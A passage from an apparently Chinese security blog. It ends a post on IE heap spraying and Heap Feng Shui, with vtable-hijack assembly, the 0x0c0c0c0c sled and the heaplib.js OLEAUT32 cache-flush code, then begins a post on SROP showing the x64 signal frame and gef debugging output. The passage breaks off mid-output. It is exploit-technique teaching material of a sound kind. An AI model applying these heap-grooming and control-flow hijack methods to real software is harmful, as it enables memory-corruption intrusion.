&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">	CVirtual MyVirtual;</span><br><span class="line">	MyVirtual.SetNumber(argc);</span><br><span class="line">	printf(&quot;%d\r\t&quot;, MyVirtual.GetNumber());</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对虚表初始化调试如下图：<br><img src="/images/FromHeapSprayToHeapFengShui/vtable_1.PNG" alt="虚表初始化调试"><br>可以看到 this == 0xaffc98,存储着 vfptr== 0x1367b34,m_nNumber</p>
<p>vfptr 指向的区域存储着两个函数指针，&amp;GetNumber == 0x13611cc;  &amp;SetNumber == 0x1361082</p>
<p>this 对象和虚表关系示意图<br><img src="/images/FromHeapSprayToHeapFengShui/vtable_2.PNG" alt="虚表初始化调试"></p>
<p>在之前的编译器中，调用对象的虚函数汇编指令可能是形如以下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; this</span><br><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">; vfptr</span><br><span class="line">MOV EDX,DWORD PTR DS:[EAX]</span><br><span class="line">; call function</span><br><span class="line">MOV EAX,[EDX+4]</span><br><span class="line">CALL EAX</span><br></pre></td></tr></table></figure></p>
<p>那么这样就有问题，如果能控制最初的指针，确保在喷射后，内存地址 0x0c0c0c0c 也包含有 0x0c0c0c0c，那么就可以形成如下的指令序列:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; this</span><br><span class="line">MOV EAX,DWORD PTR SS:[EBP+8] &lt;- put 0x0c0c0c0c in eax</span><br><span class="line">; vfptr</span><br><span class="line">MOV EDX,DWORD PTR DS:[EAX] &lt;- put 0x0c0c0c0c in edx</span><br><span class="line">; call function</span><br><span class="line">MOV EAX,[EDX+4] &lt;- put 0x0c0c0c0c in eax</span><br><span class="line">CALL EAX &lt;- jump to 0x0c0c0c0c</span><br></pre></td></tr></table></figure></p>
<p>而 0x0c0c0c0c 如果作为指令是 or al,0x0c，在任何时候都不会直接引发异常，这样就可被当作 sled 指令也不会影响执行的。</p>
<p>当然最新的编译器 ( VS2017 ) 一般都是如下图的:<br><img src="/images/FromHeapSprayToHeapFengShui/Call_vf.PNG" alt="VS2017 调用对象虚函数"></p>
<h1><span id="heapfengshui">HeapFengShui</span></h1><p>“HeapFengShui” 是由 Alexander Sotirov 提出来的。</p>
<p>他认为传统的堆喷射由于堆中内存由于 Heap cache 机制难以预测，利用不稳定且资源消耗大。因此提出了一种新的可靠且精准的利用方法。并且实现了 heaplib.js 库，使得 heap spray 更易实现。</p>
<p>IE 中涉及内存分配的组件有三个：</p>
<ul>
<li>mshtml.dll</li>
<li>jscript.dll</li>
<li>ActiveX 控制器</li>
</ul>
<h2><span id="windows-堆管理策略简述">Windows 堆管理策略简述</span></h2><p>得益于前人研究。与 Linux 下类似，Windows 用 chunk table 来管理和索引堆区中所有的空闲堆 chunk 的重要信息。chunk table 一般位于堆区的起始位置。一般分：</p>
<ul>
<li>Freelist- 空闲双向链表，空表，前端分配器</li>
<li>Lookaside- 快速单向链表，快表，heap chunk 不会发生合并，空闲 chunk header 被设置为 inuse，后端分配器</li>
</ul>
<p>其分配和释放规则如下：<br>|   |  分配   |  释放  |<br>| ——–   | :—–:   | :—-: |<br>| 小块  | 首先进行快表分配；若快表分配失败，进行普通空表分配；<br>若普通空表分配失败，使用堆缓存分配；<br>若堆缓存分配失败，尝试零号空表分配(freelist[0])；<br>若零号空表分配失败，进行内存紧缩后在尝试分配；<br>若仍无法分配，返回NULL |  优先链入快表(只能链入4个空闲块)；<br>如果快表满，则将其链入相应的空表 |<br>| 大块  | 首先使用堆缓存进行分配；<br>若堆缓存分配失败，使用free[0]中的大块进行分配    |   优先将其放入堆缓存；<br>若堆缓存满，将链入freelist[0]    |<br>| 巨块  | 要用到虚分配方法(实际上并不是从堆区分配的)    |   直接释放，没有堆表操作    |</p>
<h2><span id="oleaut32dll-的-heap-cache-机制">oleaut32.dll 的 heap cache 机制</span></h2><p>oleaut32.dll 这个引擎管理内存实现快速分配/再分配。32767 bytes 大小以上的块会直接被释放掉，并且不会被缓存。</p>
<p>缓存管理表按块大小排序组织。每一小块 “bin” 在缓存表里可以保存堆块的数值。有4种 “bin” :<br>| Bin  | Size Of Blocks this bin can hold<br>| ——–   | :—–:<br>| 0  | 1 to 32 bytes<br>| 1  | 33 to 64 bytes<br>| 2  | 65 to 256 bytes<br>| 3  | 257 to 32768 bytes<br>每一个 bin 可容纳 6 个指针</p>
<h2><span id="plunger-技术-绕过-oleaut32dll-的缓存机制">Plunger 技术 - 绕过 oleaut32.dll 的缓存机制</span></h2><p>理想的情况下，做堆喷射时，我们要确保我们的分配是由系统堆处理。通过这种方式，基于堆的可预测性的特点，连续申请会导致在同一内存地点的连续内存空间。</p>
<p>而缓存管理器返回的地址可以在堆里面的任何地方，所以地址将是不可靠的。</p>
<p>由于缓存中每个 bin 只能容纳 6 个地址，Mr.Sotirov 提出了 “plunger” 的技术，其刷新缓存中的所有块，并让他们空下来。如果缓存中没有块，缓存不能分配任何块还给你，所以确保你的内存申请使用的是系统堆，而不是 oleaut32 中的堆。这将增加获得连续内存块的可预见性。</p>
<p>为了做到这一点，他只试图申请缓存列表中的6块（1和32之间的大小的内存块申请6块，6块大小33和64之间，并为每个bin依此类推）。这样一来，确保了缓存是空的。“刷新”后发生的分配，将由系统堆处理。</p>
<p>具体代码在 heaplib.js 中 heaplib flush function 实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// The JScript interpreter uses the OLEAUT32 memory allocator for all string</span><br><span class="line">// allocations. This allocator stores freed blocks in a cache and reuses them</span><br><span class="line">// for later allocations. The cache consists of 4 bins, each storing up to 6</span><br><span class="line">// blocks. Each bin holds blocks of a certain size range:</span><br><span class="line">//</span><br><span class="line">//    0 - 32</span><br><span class="line">//    33 - 64</span><br><span class="line">//    65 - 256</span><br><span class="line">//    257 - 32768</span><br><span class="line">//</span><br><span class="line">// When a block is freed by the OLEAUT32 free function, it is stored in one of</span><br><span class="line">// the bins. If the bin is full, the smallest block in the bin is freed with</span><br><span class="line">// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768</span><br><span class="line">// bytes are not cached and are freed directly.</span><br><span class="line">//</span><br><span class="line">// To flush the cache, we need to free 6 blocks of the maximum size for each</span><br><span class="line">// bin. The maximum size blocks will push out all smaller blocks from the</span><br><span class="line">// cache. Then we allocate the maximum size blocks again, leaving the cache</span><br><span class="line">// empty.</span><br><span class="line">//</span><br><span class="line">// You need to call this function once to allocate the maximum size blocks</span><br><span class="line">// before you can use it to flush the cache.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">heapLib.ie.prototype.flushOleaut32 = function() &#123;</span><br><span class="line"></span><br><span class="line">	this.debug(&quot;Flushing the OLEAUT32 cache&quot;);</span><br><span class="line">	</span><br><span class="line">	// Free the maximum size blocks and push out all smaller blocks</span><br><span class="line">	</span><br><span class="line">	this.freeOleaut32(&quot;oleaut32&quot;);</span><br><span class="line">	</span><br><span class="line">	// Allocate the maximum sized blocks again, emptying the cache</span><br><span class="line"></span><br><span class="line">	for (var i = 0; i &lt; 6; i++) &#123;</span><br><span class="line">		this.allocOleaut32(32, &quot;oleaut32&quot;);</span><br><span class="line">		this.allocOleaut32(64, &quot;oleaut32&quot;);</span><br><span class="line">		this.allocOleaut32(256, &quot;oleaut32&quot;);</span><br><span class="line">		this.allocOleaut32(32768, &quot;oleaut32&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结合 “plunger” 技术，在任意时刻调用 GC，申请给定大小的内存块，进一步可以尝试整理堆，填补堆布局中的所有空隙，那么这样就可以保证在分配的时候堆内存是连续的。</p>
<h1><span id="reference">Reference</span></h1><ul>
<li>Alexander Sotirov.Heap Feng Shui in JavaScript.Black Hat Europe.2007</li>
<li>Exploit writing tutorial part 11 : Heap Spraying Demystified: <a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/" target="_blank" rel="external">https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/</a></li>
<li>[翻译]Windows Exploit开发系列教程第八部分：堆喷射第一节[覆写EIP]: <a href="https://bbs.pediy.com/thread-207158.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-207158.htm</a></li>
<li>[翻译]Windows exploit开发系列教程第九部分：堆喷射[第二章：UAF]—大海捞针(Finding a needle in a Haystack): <a href="https://bbs.pediy.com/thread-225210.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-225210.htm</a></li>
<li>IE浏览器漏洞综合利用技术：堆喷射技术：<a href="https://bbs.pediy.com/thread-223106.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-223106.htm</a></li>
<li>Heap Spray 技术要点：<a href="https://bbs.pediy.com/thread-156991.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-156991.htm</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/10/21/srop_detail/" itemprop="url">
                  srop 利用方式
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-21T16:00:00+08:00" content="2018-10-21">
              2018-10-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/21/srop_detail/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/21/srop_detail/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击</p>
<p>缺陷可利用：</p>
<ul>
<li>进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写</li>
<li>内核未判断之前保存的 signal frame 和 恢复时的 signal frame</li>
</ul>
<p>那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造 signal frame ，劫持控制流</p>
<p>本文简单介绍 srop 中有关 signal 和 debugger signal , syscall 的要点，最后给出一个基于 srop 利用的 x64 simple demo。</p>
<h1><span id="signal-mechanism-下内核与进程的交互">Signal mechanism 下内核与进程的交互</span></h1><p>在进程表的表项中有一个软中断信号域，该域中每一位对应一个信号，当有信号发送给进程时，对应位置位。</p>
<p>进程间的信号是通过内核来转发，A 进程 - 内核 - B 进程，当然进程自己也会触发信号。接下来的讨论是内核收到这个信号的处理流程。</p>
<p><img src="/images/signal_k2p.png" alt="Signal mechanism 下内核与进程的交互"></p>
<p>如上图所述，大概分 4 部分：</p>
<ol>
<li>内核向 B 进程 deliver a signal,该进程响应这个 signal ,暂时挂起 (suspend) , 控制权交给内核</li>
<li>内核为该进程保存相应的 context，跳转到之前注册好的 signal handle 中处理相应的 signal,此时在 user space</li>
<li>当 signal handle 返回之后,内核为该进程恢复保存的上下文</li>
<li>控制权交给 B 进程，恢复执行</li>
</ol>
<p>Signal Frame: 即保存进程 context info 的栈内存空间，x64 布局如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Offset</th>
<th style="text-align:center">reg</th>
<th style="text-align:center">reg</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x00</td>
<td style="text-align:center">rt_sigreturn</td>
<td style="text-align:center">uc_flags</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">&amp;uc</td>
<td style="text-align:center">uc_stack.ss_sp</td>
</tr>
<tr>
<td style="text-align:center">0x20</td>
<td style="text-align:center">uc_stack.ss_flags</td>
<td style="text-align:center">uc_stack.ss_size</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">r8</td>
<td style="text-align:center">r9</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">r10</td>
<td style="text-align:center">r11</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">r12</td>
<td style="text-align:center">r13</td>
</tr>
<tr>
<td style="text-align:center">0x60</td>
<td style="text-align:center">r14</td>
<td style="text-align:center">r15</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">rdi</td>
<td style="text-align:center">rsi</td>
</tr>
<tr>
<td style="text-align:center">0x80</td>
<td style="text-align:center">rbp</td>
<td style="text-align:center">rbx</td>
</tr>
<tr>
<td style="text-align:center">0x90</td>
<td style="text-align:center">rdx</td>
<td style="text-align:center">rax</td>
</tr>
<tr>
<td style="text-align:center">0xa0</td>
<td style="text-align:center">rcx</td>
<td style="text-align:center">rsp</td>
</tr>
<tr>
<td style="text-align:center">0xb0</td>
<td style="text-align:center">rip</td>
<td style="text-align:center">eflags</td>
</tr>
<tr>
<td style="text-align:center">0xc0</td>
<td style="text-align:center">cs/gs/fs</td>
<td style="text-align:center">err</td>
</tr>
<tr>
<td style="text-align:center">0xd0</td>
<td style="text-align:center">trapno</td>
<td style="text-align:center">oldmask(unused)</td>
</tr>
<tr>
<td style="text-align:center">0xe0</td>
<td style="text-align:center">cr2(segfault addr)</td>
<td style="text-align:center">&amp;fpstate</td>
</tr>
<tr>
<td style="text-align:center">0xf0</td>
<td style="text-align:center">__reserved</td>
<td style="text-align:center">sigmask</td>
</tr>
</tbody>
</table>
<p>详解下第二步，内核会将进程的 context 保存在<strong>进程的内存空间栈上</strong>，然后在栈顶填上一个返回地址: ‘rt_sigreturn()’,这个函数地址指向的就是 ‘sigreturn’ 系统调用（15 号系统调用）。</p>
<h1><span id="debugger-signal-and-find-signal-frame-struct">Debugger signal and find signal frame struct</span></h1><p>调试时，需要对 signal 处理进行设置</p>
<p>系统信号值可通过 kill -l 查阅：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP       <span class="number">2</span>) SIGINT       <span class="number">3</span>) SIGQUIT      <span class="number">4</span>) SIGILL       <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT      <span class="number">7</span>) SIGBUS       <span class="number">8</span>) SIGFPE       <span class="number">9</span>) SIGKILL     <span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV     <span class="number">12</span>) SIGUSR2     <span class="number">13</span>) SIGPIPE     <span class="number">14</span>) SIGALRM     <span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT   <span class="number">17</span>) SIGCHLD     <span class="number">18</span>) SIGCONT     <span class="number">19</span>) SIGSTOP     <span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN     <span class="number">22</span>) SIGTTOU     <span class="number">23</span>) SIGURG      <span class="number">24</span>) SIGXCPU     <span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM   <span class="number">27</span>) SIGPROF     <span class="number">28</span>) SIGWINCH    <span class="number">29</span>) SIGIO       <span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS      <span class="number">34</span>) SIGRTMIN    <span class="number">35</span>) SIGRTMIN+<span class="number">1</span>  <span class="number">36</span>) SIGRTMIN+<span class="number">2</span>  <span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span>  <span class="number">39</span>) SIGRTMIN+<span class="number">5</span>  <span class="number">40</span>) SIGRTMIN+<span class="number">6</span>  <span class="number">41</span>) SIGRTMIN+<span class="number">7</span>  <span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span>  <span class="number">44</span>) SIGRTMIN+<span class="number">10</span> <span class="number">45</span>) SIGRTMIN+<span class="number">11</span> <span class="number">46</span>) SIGRTMIN+<span class="number">12</span> <span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span> <span class="number">49</span>) SIGRTMIN+<span class="number">15</span> <span class="number">50</span>) SIGRTMAX<span class="number">-14</span> <span class="number">51</span>) SIGRTMAX<span class="number">-13</span> <span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span> <span class="number">54</span>) SIGRTMAX<span class="number">-10</span> <span class="number">55</span>) SIGRTMAX<span class="number">-9</span>  <span class="number">56</span>) SIGRTMAX<span class="number">-8</span>  <span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span>  <span class="number">59</span>) SIGRTMAX<span class="number">-5</span>  <span class="number">60</span>) SIGRTMAX<span class="number">-4</span>  <span class="number">61</span>) SIGRTMAX<span class="number">-3</span>  <span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span>  <span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure>
<p>测试代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"># gcc -o debug_sig ./debug_sig.c -g</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_signal</span><span class="params">(<span class="keyword">int</span> signum)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"handling signal: %d\n"</span>, signum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	signal(SIGINT, (<span class="keyword">void</span> *)handle_signal);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"catch me if you can\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct definition for debugging purpose */</span></span><br><span class="line"><span class="comment">// struct sigcontext sigcontext;</span></span><br></pre></td></tr></table></figure></p>
<p>结合代码 Linux source code about sigcontext struct：<a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></p>
<p>调试过程如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; handle SIGINT pass nostop</span><br><span class="line">Signal        Stop      Print   Pass to program Description</span><br><span class="line">SIGINT        No        Yes     Yes             Interrupt</span><br><span class="line"></span><br><span class="line">gef&gt; b handle_signal</span><br><span class="line"></span><br><span class="line">gef&gt; r</span><br><span class="line">Starting program: ...</span><br><span class="line">catch me if you can</span><br><span class="line"></span><br><span class="line">Ctrl+C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x14</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$rdx   : 0x0</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x0</span><br><span class="line">$rdi   : 0x2</span><br><span class="line">$rip   : 0x8000740           →  &lt;handle_signal+0&gt; push rbp</span><br><span class="line">$r8    : 0x8402000           →  0x0000000000000000</span><br><span class="line">$r9    : 0x0</span><br><span class="line">$r10   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r11   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x8000738 &lt;frame_dummy+40&gt; call   rax</span><br><span class="line">    0x800073a &lt;frame_dummy+42&gt; pop    rbp</span><br><span class="line">    0x800073b &lt;frame_dummy+43&gt; jmp    0x8000680 &lt;register_tm_clones&gt;</span><br><span class="line"> →  0x8000740 &lt;handle_signal+0&gt; push   rbp</span><br><span class="line">    0x8000741 &lt;handle_signal+1&gt; mov    rbp, rsp</span><br><span class="line">    0x8000744 &lt;handle_signal+4&gt; sub    rsp, 0x10</span><br><span class="line">    0x8000748 &lt;handle_signal+8&gt; mov    DWORD PTR [rbp-0x4], edi</span><br><span class="line">    0x800074b &lt;handle_signal+11&gt; mov    eax, DWORD PTR [rbp-0x4]</span><br><span class="line">    0x800074e &lt;handle_signal+14&gt; mov    esi, eax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+9 ]────</span><br><span class="line">      4</span><br><span class="line">      5  #include &lt;stdio.h&gt;</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line"> →    9         &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line">     11  &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000740 → Name: handle_signal(signum=0x0)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 3, handle_signal (signum=0x0) at ./debug_sig.c:9</span><br><span class="line">9       &#123;</span><br><span class="line"></span><br><span class="line">gef➤  p (struct sigcontext)*(0x00007ffffffedbb8+0x30)</span><br><span class="line">$5 = &#123;</span><br><span class="line">  r8 = 0x8402000,</span><br><span class="line">  r9 = 0x0,</span><br><span class="line">  r10 = 0x7fffff3f9b58,</span><br><span class="line">  r11 = 0x7fffff3f9b58,</span><br><span class="line">  r12 = 0x8000610,</span><br><span class="line">  r13 = 0x7ffffffee330,</span><br><span class="line">  r14 = 0x0,</span><br><span class="line">  r15 = 0x0,</span><br><span class="line">  rdi = 0x0,</span><br><span class="line">  